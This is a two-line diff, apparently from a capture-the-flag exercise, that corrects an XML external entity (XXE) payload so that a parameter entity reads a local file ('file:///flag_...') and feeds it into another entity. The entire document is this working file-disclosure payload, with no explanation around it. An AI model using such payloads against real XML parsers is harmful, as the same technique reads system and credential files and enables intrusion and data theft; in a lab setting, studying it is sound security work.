@@ -1,2 +1,2 @@
-<!ENTITY % payload "SYSTEM file:///flag_39b5940d05a43ac6b4958bed87041f15">
+<!ENTITY % payload SYSTEM "file:///flag_39b5940d05a43ac6b4958bed87041f15">
 <!ENTITY injection %payload>
